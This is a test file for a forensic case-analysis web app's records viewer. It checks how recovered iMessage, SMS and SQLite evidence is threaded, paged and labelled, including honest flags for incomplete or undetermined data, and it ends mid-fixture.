import { render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { http, HttpResponse } from 'msw'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { MemoryRouter, Route, Routes } from 'react-router-dom'
import { describe, expect, it, vi } from 'vitest'
import { server } from '../../test/server'
import { resetThumbnailCache } from '../../lib/thumbnails'
import type { ParsedRecord } from './api'
import { RecordsViewerPage } from './RecordsViewerPage'

const CASE_ID = 'case-1'

/** Serve /records paginated, keyed by the `type` query param. */
function mockByType(byType: Record<string, ParsedRecord[]>) {
  server.use(
    http.get(`/api/v1/cases/${CASE_ID}/records`, ({ request }) => {
      const url = new URL(request.url)
      const type = url.searchParams.get('type') ?? ''
      const page = Number(url.searchParams.get('page') ?? 1)
      const pageSize = Number(url.searchParams.get('page_size') ?? 50)
      const all = byType[type] ?? []
      const start = (page - 1) * pageSize
      return HttpResponse.json({
        records: all.slice(start, start + pageSize),
        total: all.length,
        page,
        page_size: pageSize,
        type,
      })
    }),
  )
}


/**
 * Serve the conversation endpoints the messaging viewer now uses, deriving the
 * thread list and per-thread pages from plain message fixtures the way the
 * server's SQL aggregation does. `attachments` are still served through
 * /records, which is where the viewer reads them from.
 */
function mockMessaging(
  type: string,
  messages: ParsedRecord[],
  attachments: { type: string; records: ParsedRecord[] } | null = null,
) {
  const keyOf = (r: ParsedRecord) =>
    (r.metadata.chat_identifier as string) ??
    (r.metadata.contact_jid as string) ??
    'unknown'
  const timeOf = (r: ParsedRecord) => Number(r.metadata.date ?? 0)

  server.use(
    http.get(`/api/v1/cases/${CASE_ID}/conversations`, () => {
      const byKey = new Map<string, ParsedRecord[]>()
      for (const r of messages) {
        const k = keyOf(r)
        byKey.set(k, [...(byKey.get(k) ?? []), r])
      }
      const conversations = [...byKey.entries()].map(([key, rs]) => {
        const newest = [...rs].sort((a, b) => timeOf(b) - timeOf(a))[0]
        return {
          key,
          label:
            (newest.metadata.chat_display_name as string) ??
            (newest.metadata.contact_name as string) ??
            key,
          count: rs.length,
          last_time: timeOf(newest),
          last_preview: (newest.metadata.text as string) ?? null,
          is_group: false,
          tag: (newest.metadata.service as string) ?? null,
        }
      })
      conversations.sort((a, b) => b.last_time - a.last_time)
      return HttpResponse.json({ conversations, type })
    }),
    http.get(
      `/api/v1/cases/${CASE_ID}/conversations/messages`,
      ({ request }) => {
        const url = new URL(request.url)
        const key = url.searchParams.get('key') ?? ''
        const before = url.searchParams.get('before')
        const beforeId = url.searchParams.get('before_id')
        // Both halves or neither, exactly as the server requires. Accepting a
        // lone `before` here is what let a client that never sent `before_id`
        // pass this suite while 400ing in the product.
        if ((before == null) !== (beforeId == null)) {
          return HttpResponse.json(
            { error: "'before' and 'before_id' must be sent together" },
            { status: 400 },
          )
        }
        const limit = Number(url.searchParams.get('limit') ?? 60)
        let rows = messages
          .filter((r) => keyOf(r) === key)
          .sort((a, b) => timeOf(b) - timeOf(a) || (a.id < b.id ? 1 : -1))
        if (before != null && beforeId != null) {
          // ord < ?  OR  (ord = ? AND id < ?)
          rows = rows.filter(
            (r) =>
              timeOf(r) < Number(before) ||
              (timeOf(r) === Number(before) && r.id < beforeId),
          )
        }
        const page = rows.slice(0, limit)
        const last = page[page.length - 1]
        // The server returns the media belonging to exactly these messages.
        const ids = new Set(page.map((r) => r.metadata.guid as string))
        const media = (attachments?.records ?? []).filter((a) =>
          ids.has(a.metadata.message_guid as string),
        )
        return HttpResponse.json({
          records: page,
          attachments: media,
          key,
          type,
          has_more: rows.length > limit,
          undecodable: 0,
          next_cursor: last ? { before: timeOf(last), before_id: last.id } : null,
        })
      },
    ),
    // The page shell still reads /records for the type's count and empty
    // state; the viewer itself uses the conversation endpoints above.
    http.get(`/api/v1/cases/${CASE_ID}/records`, ({ request }) => {
      const url = new URL(request.url)
      const t = url.searchParams.get('type') ?? ''
      const page = Number(url.searchParams.get('page') ?? 1)
      const pageSize = Number(url.searchParams.get('page_size') ?? 100)
      const all =
        t === type
          ? messages
          : attachments && t === attachments.type
            ? attachments.records
            : []
      const start = (page - 1) * pageSize
      return HttpResponse.json({
        records: all.slice(start, start + pageSize),
        total: all.length,
        page,
        page_size: pageSize,
        type: t,
      })
    }),
  )
}

function rec(
  id: string,
  metadata: Record<string, unknown>,
  parentId: string | null = `a-${id}`,
): ParsedRecord {
  return { id, parent_id: parentId, artifact_type: 'ParsedRecord', metadata }
}

function renderViewer(type: string, search = '') {
  const queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  render(
    <QueryClientProvider client={queryClient}>
      <MemoryRouter initialEntries={[`/cases/${CASE_ID}/analysis/${type}${search}`]}>
        <Routes>
          <Route path="/cases/:caseId/analysis/:type" element={<RecordsViewerPage />} />
          <Route
            path="/cases/:caseId/artifacts/:artifactId"
            element={<div>artifact page</div>}
          />
        </Routes>
      </MemoryRouter>
    </QueryClientProvider>,
  )
}

describe('MessagingViewer (iMessage)', () => {
  it('groups threads, sorts bubbles, marks sent/received, and joins an attachment', async () => {
    mockMessaging('iMessage', [
        rec(
          'm1',
          {
            type: 'iMessage',
            chat_identifier: 'chatA',
            chat_display_name: 'Alice',
            contact: '+111',
            text: 'hi from alice',
            date: 1000,
            is_from_me: false,
            service: 'iMessage',
          },
          'db1',
        ),
        rec(
          'm2',
          {
            type: 'iMessage',
            chat_identifier: 'chatA',
            chat_display_name: 'Alice',
            text: 'reply from me',
            date: 2000,
            is_from_me: true,
            direction: 'sent',
          },
          'db1',
        ),
        rec(
          'm3',
          {
            type: 'iMessage',
            chat_identifier: 'chatB',
            chat_display_name: 'Bob',
            contact: '+222',
            text: 'hey bob thread',
            date: 1500,
            is_from_me: false,
          },
          'db1',
        ),
      ],
      {
        type: 'iMessageAttachment',
        records: [
          rec(
            'att1',
            {
              type: 'iMessageAttachment',
              transfer_name: 'photo.jpg',
              mime_type: 'image/jpeg',
              total_bytes: 2048,
              is_outgoing: false,
            },
            'db1',
          ),
        ],
      },
    )
    renderViewer('iMessage')

    // Two conversations grouped by chat_identifier.
    const threads = await screen.findAllByTestId('an-thread')
    expect(threads).toHaveLength(2)
    expect(within(threads[0]).getByText('Alice')).toBeInTheDocument()

    // Selected (most-recent) thread bubbles are ordered ascending by date.
    const convo = screen.getByTestId('an-convo')
    await within(convo).findByText('hi from alice')
    const texts = [...convo.querySelectorAll('.an-msg-text')].map((n) => n.textContent)
    expect(texts).toEqual(['hi from alice', 'reply from me'])

    // Received = left; sent = right; sender labelled. Scope to the message
    // pane, since the thread sidebar also previews the last message text.
    const received = within(convo).getByText('hi from alice').closest('.an-msg')!
    expect(received.className).not.toContain('an-msg-me')
    expect(within(received as HTMLElement).getByText('+111')).toBeInTheDocument()
    const sent = within(convo).getByText('reply from me').closest('.an-msg')!
    expect(sent.className).toContain('an-msg-me')
    expect(within(sent as HTMLElement).getByText('Me')).toBeInTheDocument()

    // Attachments with no message link are not shown in the conversation at
    // all; they have their own gallery under Chats.
    expect(screen.queryByTestId('an-att-chip')).not.toBeInTheDocument()

    // Selecting the other thread swaps the message pane.
    await userEvent.click(within(threads[1]).getByText('Bob'))
    expect(
      await within(screen.getByTestId('an-convo')).findByText('hey bob thread'),
    ).toBeInTheDocument()
    expect(
      within(screen.getByTestId('an-convo')).queryByText('hi from alice'),
    ).not.toBeInTheDocument()
  })

  it('separates calendar days and keeps the full timestamp on each message', async () => {
    const DAY = 86400
    mockMessaging('iMessage', [
        rec('d1', {
          type: 'iMessage',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'first day',
          date: DAY * 10 + 3600, // 1970-01-11
        }),
        rec('d2', {
          type: 'iMessage',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'same day later',
          date: DAY * 10 + 7200, // still 1970-01-11
        }),
        rec('d3', {
          type: 'iMessage',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'next day',
          date: DAY * 11 + 60, // 1970-01-12
        }),
      ])
    renderViewer('iMessage')

    // One divider per calendar day, not per message, and absolute (never
    // "Today") so the date is unambiguous long after acquisition.
    const seps = await screen.findAllByTestId('an-day-sep')
    expect(seps.map((s) => s.textContent)).toEqual([
      'Sun, 11 January 1970',
      'Mon, 12 January 1970',
    ])

    // The per-message timestamp is still shown in full.
    const convo = screen.getByTestId('an-convo')
    const sameDay = within(convo).getByText('same day later').closest('.an-msg')!
    expect(
      within(sameDay as HTMLElement).getByText(/1970-01-11/),
    ).toBeInTheDocument()
  })

  it('windows a long conversation and loads older messages on demand', async () => {
    const many = Array.from({ length: 130 }, (_, i) =>
      rec(`w${i}`, {
        type: 'iMessage',
        chat_identifier: 'chatA',
        contact: '+111',
        text: `msg ${i}`,
        date: 1000 + i,
      }),
    )
    mockMessaging('iMessage', many)
    renderViewer('iMessage')

    // Only the most recent window renders; the newest message is present and
    // the oldest is not (the phone reading order, newest at the bottom).
    const convo = await screen.findByTestId('an-convo')
    // The newest page arrives first; the oldest messages are not fetched yet.
    expect(await within(convo).findByText('msg 129')).toBeInTheDocument()
    expect(within(convo).queryByText('msg 0')).not.toBeInTheDocument()
    await waitFor(() =>
      expect(convo.querySelectorAll('.an-msg-text')).toHaveLength(60),
    )

    // Scrolling back (or the fallback control) reveals the earlier messages.
    //
    // 120, not 119: the cursor carries the tie-breaking id now, so page two
    // resumes exactly where page one stopped rather than re-requesting the
    // second it ended on. The old timestamp-only cursor had to overlap by one
    // message to avoid skipping messages that shared a timestamp (B8-001), and
    // the viewer dropped that duplicate by id. Neither is needed.
    await userEvent.click(screen.getByRole('button', { name: /load older/i }))
    await waitFor(() =>
      expect(
        screen.getByTestId('an-convo').querySelectorAll('.an-msg-text'),
      ).toHaveLength(120),
    )
    await userEvent.click(screen.getByRole('button', { name: /load older/i }))
    expect(
      await within(screen.getByTestId('an-convo')).findByText('msg 0'),
    ).toBeInTheDocument()
  })

  it('parks undated carved bodies at the end in recovery order, notes them, and flags undeterminable direction', async () => {
    mockMessaging('iMessage', [
      // A normally-dated, directional message.
      rec('d0', {
        type: 'iMessage',
        chat_identifier: 'recovered',
        text: 'dated hello',
        date: 2000,
        is_from_me: false,
        direction: 'received',
      }),
      // Two carved bodies: no date, no direction. Supplied out of order to
      // prove recovery_index (not arrival order) drives their placement.
      rec('u2', {
        type: 'iMessage',
        chat_identifier: 'recovered',
        text: 'body two',
        recovery_index: 1,
        recovered: true,
      }),
      rec('u1', {
        type: 'iMessage',
        chat_identifier: 'recovered',
        text: 'body one',
        recovery_index: 0,
        recovered: true,
      }),
    ])
    renderViewer('iMessage')

    const convo = await screen.findByTestId('an-convo')
    // Banner warns that some messages have no date.
    expect(
      await screen.findByText(/had no recoverable date/i),
    ).toBeInTheDocument()
    // Both undated bodies carry the direction disclaimer; the dated one does not.
    expect(
      screen.getAllByText(/Direction \(Sent\/Received\) Not Determinable/i),
    ).toHaveLength(2)
    // Order: the dated message, then the carved bodies by recovery_index.
    const texts = [...convo.querySelectorAll('.an-msg-text')].map(
      (e) => e.textContent,
    )
    expect(texts).toEqual(['dated hello', 'body one', 'body two'])
  })

  it('message properties: an MMS whose direction was never recorded is not attributed to a sender', async () => {
    // `seance_plugin_android_sms` omits `is_from_me`/`direction` on a PDU whose
    // `msg_box` column is NULL, and stamps `peer_undetermined` because on MMS
    // the direction is what selects the correspondent's address row. The
    // properties panel derived From, To and Direction from `fromMe(m)`, which
    // is false for "received" AND for "never recorded" alike — so the panel an
    // examiner quotes asserted "Direction: received", "From: +1555…", "To: Me
    // (device owner)" about a message nobody established the sender of.
    mockMessaging('AndroidSms', [
      rec('mms1', {
        type: 'AndroidSms',
        service: 'MMS',
        chat_identifier: '+15551230000',
        contact: '+15551230000',
        text: 'no direction recorded',
        date: 3000,
        peer_undetermined: true,
      }),
    ])
    renderViewer('AndroidSms')

    const convo = await screen.findByTestId('an-convo')
    await userEvent.click(within(convo).getByText('no direction recorded'))
    const props = screen.getByLabelText('Message properties')

    // None of the three assertions the panel used to make survive.
    expect(within(props).queryByText('received')).not.toBeInTheDocument()
    expect(
      within(props).queryByText('Me (device owner)'),
    ).not.toBeInTheDocument()
    const undetermined = within(props).getAllByText('not determined')
    expect(undetermined).toHaveLength(3) // From, To, Direction
    // The word alone reads as a minor caveat; what it costs travels with it.
    expect(undetermined[0].getAttribute('title')).toMatch(
      /not a finding that the message was received/i,
    )

    // And the correspondent is named as the thread's address standing in, not
    // as an address selected for this message.
    const stoodIn = within(props).getByText('not selected for this message')
    expect(stoodIn).toBeInTheDocument()
    expect(stoodIn.parentElement?.getAttribute('title')).toMatch(
      /could not be selected from its own address rows/i,
    )
  })

  it('shows an attachment inline on its own message, with a clickable thumbnail', async () => {
    resetThumbnailCache()
    URL.createObjectURL = vi.fn(() => 'blob:att')
    URL.revokeObjectURL = vi.fn()
    const thumbFor: string[] = []
    const resolveBodies: string[][] = []

    mockMessaging('iMessage', [
        rec(
          'mm1',
          {
            type: 'iMessage',
            guid: 'MSG-GUID-1',
            chat_identifier: 'chatA',
            contact: '+111',
            // iMessage stores U+FFFC where the attachment sits.
            text: '￼',
            date: 5000,
            has_attachments: true,
          },
          'db1',
        ),
        rec(
          'mm2',
          {
            type: 'iMessage',
            guid: 'MSG-GUID-2',
            chat_identifier: 'chatA',
            contact: '+111',
            text: 'no media here',
            date: 6000,
          },
          'db1',
        ),
      ],
      {
        type: 'iMessageAttachment',
        records: [
        rec(
          'att1',
          {
            type: 'iMessageAttachment',
            message_guid: 'MSG-GUID-1',
            filename: '~/Library/SMS/Attachments/ab/12/G/IMG_1.jpeg',
            transfer_name: 'IMG_1.jpeg',
            mime_type: 'image/jpeg',
            total_bytes: 2048,
          },
          'db1',
        ),
        ],
      },
    )
    server.use(
      http.post(`/api/v1/cases/${CASE_ID}/files/resolve`, async ({ request }) => {
        const body = (await request.json()) as { paths: string[] }
        resolveBodies.push(body.paths)
        return HttpResponse.json({
          matches: {
            '~/Library/SMS/Attachments/ab/12/G/IMG_1.jpeg': 'file-1',
          },
        })
      }),
      http.get(
        `/api/v1/cases/${CASE_ID}/artifacts/:artifactId/thumbnail`,
        ({ params }) => {
          thumbFor.push(params.artifactId as string)
          return new HttpResponse(new Uint8Array([137, 80, 78, 71]).buffer, {
            headers: { 'Content-Type': 'image/png' },
          })
        },
      ),
    )
    renderViewer('iMessage')

    // The attachment renders in its own message's bubble, not in a side list.
    const convo = await screen.findByTestId('an-convo')
    await within(convo).findByTestId('an-att-chip')
    const chip = within(convo).getByTestId('an-att-chip')
    const bubble = chip.closest('.an-msg')!
    expect(bubble.textContent).not.toContain('no media here')

    // Its media was located in the evidence, so the chip previews the image and
    // is openable.
    expect(resolveBodies[0]).toEqual([
      '~/Library/SMS/Attachments/ab/12/G/IMG_1.jpeg',
    ])
    await waitFor(() => expect(thumbFor).toContain('file-1'))
    expect(
      within(within(convo).getByTestId('an-att-chip')).getByAltText('IMG_1.jpeg'),
    ).toHaveAttribute('src', 'blob:att')

    // The U+FFFC placeholder is not rendered as message text.
    expect(bubble.textContent).not.toContain('￼')

    // The conversation shows only message-linked media; the rest lives in the
    // dedicated media gallery.
    expect(within(convo).getAllByTestId('an-att-chip')).toHaveLength(1)

    // Double-clicking the located media opens its file artifact.
    await userEvent.dblClick(within(convo).getByTestId('an-att-chip'))
    expect(await screen.findByText('artifact page')).toBeInTheDocument()
  })

  it('surfaces the incompleteness pair on the thread, on the bubble and in the inspector', async () => {
    // The chat pane is the most court-quoted surface in the product. A thread
    // whose backing database was truncated, or whose rows would not decode,
    // presented as a complete conversation: the parsers stamped the pair and
    // nothing here read it.
    mockMessaging('iMessage', [
      rec(
        'ok1',
        {
          type: 'iMessage',
          guid: 'G-OK',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'this one parsed cleanly',
          date: 1000,
          is_from_me: false,
        },
        'db1',
      ),
      rec(
        'short1',
        {
          type: 'iMessage',
          guid: 'G-SHORT',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'this one was cut',
          date: 2000,
          is_from_me: false,
          content_incomplete: true,
          content_incomplete_reason: 'short_read',
        },
        'db1',
      ),
    ])
    renderViewer('iMessage')

    // The chat pane's own banner, over the messages the pane itself loaded —
    // not the page shell's, which covers its own page-1 sample.
    const pane = await screen.findByLabelText('Messages')
    expect(
      await within(pane).findByText(/1 of the 2 messages here declares itself/),
    ).toBeInTheDocument()
    expect(
      within(pane).getByText(
        /a read returned fewer bytes than the structure requires/,
      ),
    ).toBeInTheDocument()

    // And WHICH one. The banner alone leaves an examiner reading the thread —
    // or screenshotting one bubble — unable to tell the truncated message from
    // the ones either side of it.
    const convo = screen.getByTestId('an-convo')
    const badges = within(convo).getAllByRole('note')
    expect(badges).toHaveLength(1)
    expect(badges[0].getAttribute('aria-label')).toContain('content incomplete')

    // The inspector repeats it in full, above the provenance it governs.
    await userEvent.click(within(convo).getByText('this one was cut'))
    const props = screen.getByLabelText('Message properties')
    expect(
      within(props).getByText(/The bytes behind this are not all of it/),
    ).toBeInTheDocument()
  })

  it('shows no incompleteness banner over a thread that parsed whole', async () => {
    // The other half of the contract: a banner that is always there is a banner
    // an examiner learns to scroll past.
    mockMessaging('iMessage', [
      rec(
        'ok2',
        {
          type: 'iMessage',
          guid: 'G-OK2',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'nothing wrong here',
          date: 1000,
          is_from_me: false,
        },
        'db1',
      ),
    ])
    renderViewer('iMessage')

    expect(await screen.findByText('nothing wrong here')).toBeInTheDocument()
    expect(screen.queryByText(/declares itself/)).not.toBeInTheDocument()
    expect(screen.queryByText(/declare themselves/)).not.toBeInTheDocument()
  })

  it('does not present a capped chat search as the whole match set (B4-020)', async () => {
    // `/conversations/search` stops at its limit without counting past it and
    // labels the response. This client discarded the label, so "N matches" read
    // as the match count when it was the page size.
    mockMessaging('iMessage', [
      rec(
        'h1',
        {
          type: 'iMessage',
          guid: 'G-H1',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'needle one',
          date: 1000,
        },
        'db1',
      ),
    ])
    server.use(
      http.get(`/api/v1/cases/${CASE_ID}/conversations/search`, () =>
        HttpResponse.json({
          hits: [
            { id: 'h1', thread_key: 'chatA', text: 'needle one', date: 1000 },
          ],
          limit: 1,
          truncated: true,
          count_is_lower_bound: true,
        }),
      ),
    )
    renderViewer('iMessage')

    await screen.findAllByTestId('an-thread')
    await userEvent.type(
      screen.getByLabelText('Search messages'),
      'needle{Enter}',
    )

    expect(await screen.findByTestId('an-search-capped')).toBeInTheDocument()
    expect(screen.getByText(/at least 1 match/)).toBeInTheDocument()
  })

  it('does not render a failed chat search as "no messages match"', async () => {
    // Absence of evidence is not evidence of absence: a 500 from the search
    // endpoint must not be shown as a term that appears nowhere in the chats.
    mockMessaging('iMessage', [
      rec(
        'h2',
        {
          type: 'iMessage',
          guid: 'G-H2',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'anything',
          date: 1000,
        },
        'db1',
      ),
    ])
    server.use(
      http.get(`/api/v1/cases/${CASE_ID}/conversations/search`, () =>
        HttpResponse.json(
          { error: { code: 'INTERNAL', message: 'search index offline' } },
          { status: 500 },
        ),
      ),
    )
    renderViewer('iMessage')

    await screen.findAllByTestId('an-thread')
    await userEvent.type(
      screen.getByLabelText('Search messages'),
      'needle{Enter}',
    )

    expect(await screen.findByText(/The search failed/)).toBeInTheDocument()
    expect(screen.getByText(/search index offline/)).toBeInTheDocument()
    expect(screen.queryByText(/No messages match/)).not.toBeInTheDocument()
  })

  it('does not claim media is missing while the lookup is unfinished or failed (B4-025)', async () => {
    // `not in evidence` is a statement about the backup. Printing it whenever
    // the batched path lookup has not produced an id yet said that about media
    // that IS in the backup — permanently, when the lookup fails.
    resetThumbnailCache()
    URL.createObjectURL = vi.fn(() => 'blob:att')
    URL.revokeObjectURL = vi.fn()

    mockMessaging(
      'iMessage',
      [
        rec(
          'mm1',
          {
            type: 'iMessage',
            guid: 'MSG-GUID-1',
            chat_identifier: 'chatA',
            contact: '+111',
            text: 'look at this',
            date: 5000,
            has_attachments: true,
          },
          'db1',
        ),
      ],
      {
        type: 'iMessageAttachment',
        records: [
          rec(
            'att1',
            {
              type: 'iMessageAttachment',
              message_guid: 'MSG-GUID-1',
              filename: '~/Library/SMS/Attachments/ab/12/G/IMG_1.jpeg',
              transfer_name: 'IMG_1.jpeg',
              mime_type: 'image/jpeg',
              total_bytes: 2048,
            },
            'db1',
          ),
        ],
      },
    )
    server.use(
      http.post(`/api/v1/cases/${CASE_ID}/files/resolve`, () =>
        HttpResponse.json(
          { error: { code: 'INTERNAL', message: 'resolve failed' } },
          { status: 500 },
        ),
      ),
    )
    renderViewer('iMessage')

    const convo = await screen.findByTestId('an-convo')
    const chip = await within(convo).findByTestId('an-att-chip')
    await waitFor(() =>
      expect(chip.textContent).toContain('lookup failed'),
    )
    expect(chip.textContent).not.toContain('not in evidence')
  })

  it('says so when the server capped the attachment fetch for a page', async () => {
    // `attachments_for_messages` stops at ATTACHMENT_FETCH_CAP and reports it
    // in `attachments_truncated` precisely so a client can say the media list
    // is a subset. This client discarded the field, so a capped page rendered
    // exactly like a complete one and a message whose photos fell past the cap
    // showed no chip at all — an absence the tool had not established.
    mockMessaging('iMessage', [
      rec(
        'cap1',
        {
          type: 'iMessage',
          guid: 'G-CAP',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'media heavy thread',
          date: 1000,
        },
        'db1',
      ),
    ])
    server.use(
      http.get(
        `/api/v1/cases/${CASE_ID}/conversations/messages`,
        ({ request }) => {
          const key = new URL(request.url).searchParams.get('key') ?? ''
          return HttpResponse.json({
            records: [
              rec(
                'cap1',
                {
                  type: 'iMessage',
                  guid: 'G-CAP',
                  chat_identifier: 'chatA',
                  contact: '+111',
                  text: 'media heavy thread',
                  date: 1000,
                },
                'db1',
              ),
            ],
            attachments: [],
            attachments_truncated: true,
            key,
            type: 'iMessage',
          })
        },
      ),
    )
    renderViewer('iMessage')

    const note = await screen.findByTestId('an-att-capped')
    expect(note).toHaveTextContent(/Media is missing from this view/)
    expect(note).toHaveTextContent(/is not evidence the message had no attachment/)
  })

  it('shows no attachment-cap note when the server did not cap the fetch', async () => {
    // A note on every thread is a note an examiner scrolls past.
    mockMessaging('iMessage', [
      rec(
        'nocap1',
        {
          type: 'iMessage',
          guid: 'G-NOCAP',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'ordinary thread',
          date: 1000,
        },
        'db1',
      ),
    ])
    renderViewer('iMessage')

    expect(await screen.findByText('ordinary thread')).toBeInTheDocument()
    expect(screen.queryByTestId('an-att-capped')).not.toBeInTheDocument()
  })

  it('lists every correspondent without downloading their messages', async () => {
    // 5,000 messages across 3 correspondents: the thread list must come from
    // the aggregation, and only the selected thread's messages are fetched.
    const many = Array.from({ length: 5000 }, (_, i) =>
      rec(`b${i}`, {
        type: 'iMessage',
        chat_identifier: `chat${i % 3}`,
        chat_display_name: `Person ${i % 3}`,
        contact: `+${i % 3}`,
        text: `msg ${i}`,
        date: 1000 + i,
      }),
    )
    let messageRequests = 0
    mockMessaging('iMessage', many)
    server.use(
      http.get(
        `/api/v1/cases/${CASE_ID}/conversations/messages`,
        ({ request }) => {
          messageRequests += 1
          const url = new URL(request.url)
          const key = url.searchParams.get('key') ?? ''
          const rows = many
            .filter((r) => r.metadata.chat_identifier === key)
            .sort((a, b) => Number(b.metadata.date) - Number(a.metadata.date))
          return HttpResponse.json({ records: rows.slice(0, 60) })
        },
      ),
    )
    renderViewer('iMessage')

    // All three correspondents are listed with their true message counts.
    const threads = await screen.findAllByTestId('an-thread')
    expect(threads).toHaveLength(3)
    expect(within(threads[0]).getByText(/1,6[0-9]{2}/)).toBeInTheDocument()

    // Only the selected conversation's messages were fetched — not all 5,000.
    await within(screen.getByTestId('an-convo')).findAllByText(/^msg /)
    expect(messageRequests).toBe(1)
    expect(
      screen.getByTestId('an-convo').querySelectorAll('.an-msg-text').length,
    ).toBeLessThanOrEqual(60)
  })

  it('names a correspondent from the address book, keeping the handle visible', async () => {
    mockMessaging('iMessage', [
      rec('c1', {
        type: 'iMessage',
        chat_identifier: '+420728039692',
        contact: '+420728039692',
        text: 'hello',
        date: 1000,
      }),
    ])
    // The address book stores the national form; the chat stores E.164.
    server.use(
      http.get(`/api/v1/cases/${CASE_ID}/records`, ({ request }) => {
        const t = new URL(request.url).searchParams.get('type') ?? ''
        if (t === 'Contact') {
          return HttpResponse.json({
            records: [
              rec('k1', {
                type: 'Contact',
                display_name: 'Deni Novak',
                phone_numbers: ['728 039 692'],
                emails: [],
              }),
            ],
            total: 1,
            page: 1,
            page_size: 500,
            type: t,
          })
        }
        return HttpResponse.json({
          records: t === 'iMessage' ? [rec('c1', { type: 'iMessage', text: 'hello' })] : [],
          total: t === 'iMessage' ? 1 : 0,
          page: 1,
          page_size: 100,
          type: t,
        })
      }),
    )
    renderViewer('iMessage')

    const thread = (await screen.findAllByTestId('an-thread'))[0]
    expect(await within(thread).findByText('Deni Novak')).toBeInTheDocument()
    // The identifier the chat actually recorded is still shown, so the
    // inferred name never hides it.
    expect(within(thread).getByText('+420728039692')).toBeInTheDocument()
  })

  it('applies the per-app bubble palette', async () => {
    mockMessaging('iMessage', [
        rec('t1', {
          type: 'iMessage',
          chat_identifier: 'chatA',
          contact: '+111',
          text: 'themed',
          date: 1000,
        }),
      ])
    renderViewer('iMessage')
    await screen.findByTestId('an-convo')
    expect(document.querySelector('.an-chat')?.className).toContain(
      'an-theme-imessage',
    )
  })
})

describe('SqliteViewer', () => {
  it('lists tables, highlights deleted rows, and switches tables', async () => {
    mockByType({
      SqliteRow: [
        rec('s1', {
          type: 'SqliteRow',
          table: 'messages',
          rowid: 1,
          deleted: false,
          confidence: 255,
          columns: { text: 'live msg' },
        }),
        rec('s2', {
          type: 'SqliteRow',
          table: 'messages',
          rowid: 2,
          deleted: true,
          recovery_source: 'freelist',
          confidence: 200,
          columns: { text: 'ghost' },
        }),
        rec('s3', {
          type: 'SqliteRow',
          table: 'contacts',
          rowid: 1,
          deleted: false,
          columns: { name: 'Alice' },
        }),
      ],
    })
    renderViewer('SqliteRow')

    // Default table = messages (most rows). Both rows visible.
    await screen.findByText('live msg')
    expect(screen.getByText('ghost')).toBeInTheDocument()
    const deleted = screen.getByTestId('sqlite-deleted-row')
    expect(deleted).toHaveClass('an-row-deleted')
    expect(within(deleted).getByText('freelist')).toBeInTheDocument()

    // Two tables offered.
    expect(screen.getAllByTestId('an-db-table')).toHaveLength(2)

    // Switch to contacts: its row shows, the messages row does not.
    await userEvent.click(screen.getByText('contacts').closest('button')!)
    expect(await screen.findByText('Alice')).toBeInTheDocument()
    expect(screen.queryByText('ghost')).not.toBeInTheDocument()
  })

  it('lists every database from its summary, even one whose rows are past the row window', async () => {
    // Regression: with many rows in an early database, a later database's rows
    // fall past the fetched row window. Sourcing the rail from the per-database
    // summaries keeps every database listed, and its rows load when selected.
    const DB4 = 'db4-artifact'
    server.use(
      http.get(`/api/v1/cases/${CASE_ID}/records`, ({ request }) => {
        const url = new URL(request.url)
        const t = url.searchParams.get('type') ?? ''
        const sourceId = url.searchParams.get('source_id')
        const page = Number(url.searchParams.get('page') ?? 1)
        const pageSize = Number(url.searchParams.get('page_size') ?? 100)
        const paginate = (all: ParsedRecord[]) => ({
          records: all.slice((page - 1) * pageSize, page * pageSize),
          total: all.length,
          page,
          page_size: pageSize,
          type: t,
        })
        if (t === 'SqliteDatabaseForensics') {
          return HttpResponse.json(
            paginate([
              rec('s2', {
                type: 'SqliteDatabaseForensics',
                database: '2.db',
                database_artifact: 'db2-artifact',
                tables: ['messages'],
                live_rows: 900,
              }),
              rec('s3', {
                type: 'SqliteDatabaseForensics',
                database: '3.db',
                database_artifact: 'db3-artifact',
                tables: ['contacts'],
                live_rows: 5,
              }),
              rec('s4', {
                type: 'SqliteDatabaseForensics',
                database: '4.db',
                database_artifact: DB4,
                tables: ['notes'],
                live_rows: 3,
              }),
            ]),
          )
        }
        if (t === 'SqliteRow') {
          const rows =
            sourceId === DB4
              ? [
                  rec('r4', {
                    type: 'SqliteRow',
                    database: '4.db',
                    table: 'notes',
                    rowid: 1,
                    columns: { body: 'note four' },
                  }),
                ]
              : [
                  rec('r2', {
                    type: 'SqliteRow',
                    database: '2.db',
                    table: 'messages',
                    rowid: 1,
                    columns: { text: 'hi from two' },
                  }),
                ]
          return HttpResponse.json(paginate(rows))
        }
        return HttpResponse.json(paginate([]))
      }),
    )
    renderViewer('SqliteRow')

    // All three databases appear — including 4.db, whose rows sit past the window.
    const dbs = await screen.findAllByTestId('an-db-item')
    const labels = dbs.map((d) => d.textContent ?? '')
    expect(labels.some((l) => l.includes('2.db'))).toBe(true)
    expect(labels.some((l) => l.includes('3.db'))).toBe(true)
    expect(labels.some((l) => l.includes('4.db'))).toBe(true)

    // The busiest database is selected first; its scoped rows load.
    expect(await screen.findByText('hi from two')).toBeInTheDocument()

    // Selecting 4.db loads its own rows (scoped by its artifact).
    await userEvent.click(screen.getByText('4.db').closest('button')!)
    expect(await screen.findByText('note four')).toBeInTheDocument()
  })

  it('lazily loads rows a page at a time instead of the whole table at once', async () => {
    // A 250-row table: only the first page (200) must be fetched up front.
    const all: ParsedRecord[] = Array.from({ length: 250 }, (_, i) =>
      rec(`r${i}`, {
        type: 'SqliteRow',
        database: 'big.db',
        table: 'messages',
        rowid: i,
        columns: { text: `row ${i}` },
      }),
    )
    const sqliteRowPagesRequested: number[] = []
    server.use(
      http.get(`/api/v1/cases/${CASE_ID}/records`, ({ request }) => {
        const url = new URL(request.url)
        const t = url.searchParams.get('type') ?? ''
        const page = Number(url.searchParams.get('page') ?? 1)
        const pageSize = Number(url.searchParams.get('page_size') ?? 100)
        if (t === 'SqliteDatabaseForensics') {
          return HttpResponse.json({
            records: [
